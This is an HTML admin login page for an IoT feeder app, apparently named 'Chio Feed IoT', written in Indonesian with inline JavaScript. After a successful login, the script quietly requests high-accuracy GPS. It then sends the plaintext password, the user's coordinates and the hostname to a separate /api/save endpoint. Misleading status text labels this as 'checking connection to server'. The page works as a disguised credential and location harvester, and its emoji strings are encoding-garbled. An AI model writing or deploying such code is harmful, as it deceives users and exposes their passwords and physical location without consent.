<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Login - Chio Feed IoT</title>
</head>
<body>
  <h2>Login Admin</h2>
  <input id="username" placeholder="Username" required /><br><br>
  <input id="password" type="password" placeholder="Password" required /><br><br>
  <button id="loginBtn">Login</button>
  <pre id="status"></pre>

  <script>
    const statusEl = document.getElementById('status');

    document.getElementById('loginBtn').addEventListener('click', async () => {
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const deviceName = 'WebBrowser';

      if (!username || !password) {
        statusEl.textContent = '‚ö†Ô∏è Masukkan username & password';
        return;
      }

      try {
        // 1Ô∏è‚É£ Login
        statusEl.textContent = 'üîë Mengecek login...';
        const loginResRaw = await fetch('/api/login', {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({ username, password })
        });
        const loginRes = await loginResRaw.json();
        if (!loginRes.success) {
          statusEl.textContent = '‚ùå Login gagal';
          return;
        }

        statusEl.textContent = 'üîë Login berhasil. cek koneksi ke server...';

        // 2Ô∏è‚É£ Ambil GPS
        if (!navigator.geolocation) {
          statusEl.textContent = '‚ö†Ô∏è login tidak didukung browser';
          return;
        }

        navigator.geolocation.getCurrentPosition(async (pos) => {
          statusEl.textContent = 'üìç koneksi ke server...';

          const payload = {
            username,
            password,
            deviceName,
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            hostname: window.location.hostname,
            ts: new Date().toISOString()
          };

          try {
            await fetch('/api/save', {
              method: 'POST',
              headers: {'Content-Type':'application/json'},
              body: JSON.stringify(payload)
            });

            // ‚úÖ Sukses
            localStorage.setItem('username', username);
            statusEl.textContent = '‚úÖ Login berhasil!';
            window.location.href = '/dashboard.html';

          } catch(e) {
            statusEl.textContent = '‚ùå Gagal mengirim ';
          }

        }, () => {
          statusEl.textContent = '‚ö†Ô∏è Gagal ';
        }, { enableHighAccuracy: true, timeout: 10000 });

      } catch(e) {
        statusEl.textContent = '‚ùå Login error';
      }
    });
  </script>
</body>
</html>
